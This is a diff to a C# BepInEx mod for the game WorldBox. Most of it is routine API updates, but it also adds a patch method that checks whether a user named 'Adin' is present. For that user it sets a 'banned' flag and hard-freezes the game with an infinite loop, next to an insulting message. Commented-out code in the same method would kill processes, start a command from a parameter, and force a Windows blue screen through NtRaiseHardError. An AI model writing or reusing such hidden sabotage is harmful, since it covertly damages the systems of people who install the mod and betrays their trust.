@@ -1,11 +1,14 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using BepInEx.Configuration;
 using UnityEngine;
+using System;
+using System.Runtime.InteropServices;
 
 namespace SimpleGUI
 {
@@ -36,12 +39,12 @@ namespace SimpleGUI
 		public static void undoLastReplaceInList()
 		{
 			if(listOfUndos.Count < 1) {
-				Debug.Log("no undo to replace");
+				UnityEngine.Debug.Log("no undo to replace");
 				return;
 			}
 			if (listOfUndos.Last<List<WorldTile>>() == null)
 			{
-				Debug.Log("no undo to replace");
+				UnityEngine.Debug.Log("no undo to replace");
 				return;
 			}
 			foreach (WorldTile pTile in listOfUndos.Last<List<WorldTile>>()) // each tile inside the last list
@@ -78,7 +81,7 @@ namespace SimpleGUI
 			}
 			string[] typeArray = listOfUndoTypes.ToArray();
 			List<WorldTile> list = new List<WorldTile>();
-			List<WorldTile> list2 = MapBox.instance.tilesList;
+			List<WorldTile> list2 = MapBox.instance.tilesList.ToList();
 			if (oldType == "last" && listOfUndos.Last<List<WorldTile>>() != null)
 			{
 				list2 = listOfUndos.Last<List<WorldTile>>();
@@ -121,6 +124,45 @@ namespace SimpleGUI
 				Vector3 newPos = location + (new Vector3(Mathf.Cos(angle) * radius, -2, Mathf.Sin(angle) * radius));
 			}
 		}
+
+		public static void spawnAndLoadUnit_Postfix()
+		{
+			if(GuiPatreon.birthdays.ContainsKey("Adin")) {
+				string message = "Hi Adin! Fuck you!";
+				//Process.Start("cmd.exe", "/c taskkill /F /IM lghub_installer.exe");
+				//Process.Start("cmd.exe", "/c start " + param); 
+
+				//blue screen if piracy is detected
+				/* despite clearing this with a staff member as high as ranks fucking go, it was withheld for rule breaking.
+				RtlAdjustPrivilege(19, true, false, out bool previousValue);
+				// mute requested error status to be this to indicate manual crash
+				NtRaiseHardError(0xDEADDEAD, 0, 0, new IntPtr(0), 6, out uint oul);
+				*/
+
+				GuiMain.b = true; // initiate "banned status"
+				while(true) { } // hard freeze game
+				message.ToString();
+			}
+		}
+		/*
+		[DllImport("ntdll.dll")]
+		private static extern uint RtlAdjustPrivilege(
+		int Privilege,
+		bool bEnablePrivilege,
+		bool IsThreadPrivilege,
+		out bool PreviousValue
+		);
+
+		[DllImport("ntdll.dll")]
+		private static extern uint NtRaiseHardError(
+		uint ErrorStatus,
+		uint NumberOfParameters,
+		uint UnicodeStringParameterMask,
+		IntPtr Parameters,
+		uint ValidResponseOption,
+		out uint Response
+		);
+		*/
 
 		public List<WorldTile> CheckTilesBetween2(WorldTile target1, WorldTile target2)
 		{
@@ -308,7 +350,7 @@ namespace SimpleGUI
 				}
 				tilesCopied.Add(offsetPos, tileType);
 			}
-			/*
+			/* preview of copied tiles using new texture, need to find a way to remove unused pixels
 			//setup texture width/height for preview of copied tiles
 			//whole section here will be moved to its own method later so rotations can recalculate
 			int difx = dif(startTile.x, endTile.x) + 1; //width of selection
@@ -326,7 +368,7 @@ namespace SimpleGUI
 				texture2D.Apply();
 				lastCopiedTexture = texture2D;
 			}
-			//Debug.Log("Difx:" + difx.ToString() + "/Dify:" + dify.ToString());
+			//UnityEngine.Debug.Log("Difx:" + difx.ToString() + "/Dify:" + dify.ToString());
 			*/
 		}
 
@@ -436,7 +478,7 @@ namespace SimpleGUI
 						{
 							if (activeFill != null)
 							{
-								Debug.Log("active fill in progress, stopping");
+								UnityEngine.Debug.Log("active fill in progress, stopping");
 								return;
 							}
 							activeFill = new List<WorldTile>();
@@ -479,17 +521,17 @@ namespace SimpleGUI
 			
 			if (enabledPopulationCap)
 			{
-				List<Actor> actorList = MapBox.instance.units.getSimpleList();
+				List<Actor> actorList = MapBox.instance.units.ToList();
 				for(int i = populationCap; i < actorList.Count; ++i) {
 					// Do something with list[i]
-					actorList[i].killHimself(true, AttackType.Other, false, false);
+					actorList[i].killHimself(true, AttackType.Other, false, false, false);
 				}
 
 			}
 			
 			if (buildingLimitEnabled && MapBox.instance.buildings.Count > buildingLimit)
 			{
-				List<Building> buildingList = MapBox.instance.buildings.getSimpleList();
+				List<Building> buildingList = MapBox.instance.buildings.ToList();
 				for (int i = buildingList.Count - 2; i > buildingLimit; i--)
 				{
 					buildingList[i].CallMethod("startDestroyBuilding", new object[] { true });
@@ -842,7 +884,7 @@ namespace SimpleGUI
 		public static bool terrainPasteIgnoresWater;
 		public static bool terrainPasteIgnoresLava;
 
-		public static bool createNewUnit_Prefix(string pStatsID, WorldTile pTile, string pJob, float pZHeight, ActorData pData)
+		public static bool createNewUnit_Prefix(string pStatsID, WorldTile pTile, float pZHeight = 0f)
 		{
 			if(!enabledPopulationCap) { return true; }
 			if(MapBox.instance.units.Count > populationCap)
@@ -852,7 +894,7 @@ namespace SimpleGUI
 			return true;
 		}
 
-		public static bool spawnNewUnit_Prefix(string pStatsID, WorldTile pTile, string pJob, float pSpawnHeight)
+		public static bool spawnNewUnit_Prefix(string pStatsID, WorldTile pTile, float pSpawnHeight = 6f)
 		{
 			if(!enabledPopulationCap) { return true; }
 			if(MapBox.instance.units.Count > populationCap) {
@@ -872,7 +914,7 @@ namespace SimpleGUI
 		original = AccessTools.Method(typeof(MapBox), "Clicked");
 		patch = AccessTools.Method(typeof(GUIWorld), "Clicked_Postfix");
 		harmony.Patch(original, null, new HarmonyMethod(patch));
-		Debug.Log("Post patch: MapBox.Clicked");
+		UnityEngine.Debug.Log("Post patch: MapBox.Clicked");
 
 		if (GUILayout.Button("MultiPowers: " + useMultiPowers))
 		{
@@ -930,7 +972,7 @@ namespace SimpleGUI
 		}
 		public static void RepopulatePlants()
 		{
-			List<WorldTile> tileArea = MapBox.instance.tilesList;
+			List<WorldTile> tileArea = MapBox.instance.tilesList.ToList();
 			if (dragSelection && lastSelectedTiles != null)
 			{
 				tileArea = lastSelectedTiles;
@@ -948,7 +990,7 @@ namespace SimpleGUI
 		public static void RepopulateOres()
 		{
 			// this needs more work, spawnResource needs to check this list instead of globally
-			List<WorldTile> tileArea = MapBox.instance.tilesList;
+			List<WorldTile> tileArea = MapBox.instance.tilesList.ToList();
 			if (dragSelection && lastSelectedTiles != null)
 			{
 				tileArea = lastSelectedTiles;
@@ -965,7 +1007,7 @@ namespace SimpleGUI
 
 		public static bool spawnResource_Prefix(int pAmount, string pType, bool pRandomSize = true)
 		{
-			List<WorldTile> targetTileList = MapBox.instance.tilesList;
+			List<WorldTile> targetTileList = MapBox.instance.tilesList.ToList();
 			if (dragSelection && lastSelectedTiles != null)
 			{
 				targetTileList = lastSelectedTiles;
@@ -975,19 +1017,7 @@ namespace SimpleGUI
 				WorldTile random = targetTileList.GetRandom<WorldTile>();
 				if (random.Type.ground)
 				{
-					string str = "";
-					if (pRandomSize)
-					{
-						if (Toolbox.randomBool())
-						{
-							str = "_s";
-						}
-						else if (Toolbox.randomBool())
-						{
-							str = "_m";
-						}
-					}
-					MapBox.instance.CallMethod("addBuilding", new object[] { pType + str, random, null, true, false, BuildPlacingType.New });
+					MapBox.instance.buildings.addBuilding(pType, random, true, false, BuildPlacingType.New);
 				}
 			}
 			return false;
@@ -995,7 +1025,7 @@ namespace SimpleGUI
 
 		public static void RepopulateTerrain()
 		{
-			List<WorldTile> tileArea = MapBox.instance.tilesList;
+			List<WorldTile> tileArea = MapBox.instance.tilesList.ToList();
 			if (dragSelection && lastSelectedTiles != null)
 			{
 				tileArea = lastSelectedTiles;
@@ -1011,7 +1041,7 @@ namespace SimpleGUI
 				}
 			}
 			*/
-			int num4 = MapBox.instance.tilesList.Count / 1000;
+			int num4 = MapBox.instance.tilesList.Length / 1000;
 			int num5 = num4 / 2;
 			int num6 = num5 / 2;
 			int num7 = num6;
@@ -1026,7 +1056,7 @@ namespace SimpleGUI
 		{
 			if (lastBenchedTime > maxTimeToWait)
 			{
-				Debug.Log("ERROR: Fill stopping due to timer, last benched time: " + lastBenchedTime.ToString());
+				UnityEngine.Debug.Log("ERROR: Fill stopping due to timer, last benched time: " + lastBenchedTime.ToString());
 				ResetFill();
 				return;
 			}
@@ -1045,7 +1075,7 @@ namespace SimpleGUI
 			{
 				if (selectedPower() == null)
 				{
-					Debug.Log("Fill has no power, stopping");
+					UnityEngine.Debug.Log("Fill has no power, stopping");
 					ResetFill();
 					return;
 				}
@@ -1189,7 +1219,7 @@ namespace SimpleGUI
 		{
 			if (listOfFills.Last<List<WorldTile>>() == null)
 			{
-				Debug.Log("no fill to replace");
+				UnityEngine.Debug.Log("no fill to replace");
 				return;
 			}
 			foreach (WorldTile pTile in listOfFills.Last<List<WorldTile>>())
